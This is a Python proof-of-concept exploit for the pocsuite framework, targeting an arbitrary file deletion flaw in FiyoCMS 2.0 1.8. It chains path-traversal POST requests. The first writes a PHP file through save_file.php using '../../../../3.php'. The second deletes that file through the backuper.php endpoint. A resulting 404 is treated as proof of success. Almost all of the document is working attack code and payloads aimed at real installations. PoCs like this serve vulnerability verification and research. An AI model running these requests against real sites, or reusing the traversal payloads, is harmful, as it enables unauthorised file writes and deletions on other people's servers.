#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def post_url(url, data, refer):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "refer"
        }
        resp = httpreq.post(url, data=data)
    except Exception as ex:
        resp = None
    return resp

class TestPOC(POCBase):
    name = 'fiyocms2.0 1.8 file-deletion Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'file-deletion'
    version = '1'
    references = ['http://p0desta.com/2018/10/15/fiyocms代码审计']
    desc = '''fiyocms dapur/apps/app_config/controller/backuper.php/ 存在任意文件删除'''

    vulDate = '2018-10-15'
    createDate = '2019-04-13'
    updateDate = '2019-04-13'

    appName = 'fiyocms'
    appVersion = '2.0 1.8'
    appPowerLink = 'https://github.com/FiyoCMS/FiyoCMS'
    samples = ['re']

    
    def _attack(self):
        """attack mode"""
        return self._verify()
        
    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/dapur/apps/app_theme/libs/save_file.php'
        data = {
        "src": "../../../../3.php",
        "content": "<?php echo 'OKOKOK';?>",
        }
        refer = self.url
        resp = post_url(self.url + payload1,data,refer)

        payload2 = '/dapur/apps/app_config/controller/backuper.php/'
        data2 = {
        "type": "database",
        "file": "../3.php",
        }
        resp1 = post_url(self.url + payload2,data2,refer)
        resp2 = req.get(self.url + '/3.php')
        time.sleep(1)
        if resp2.status_code == 404:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

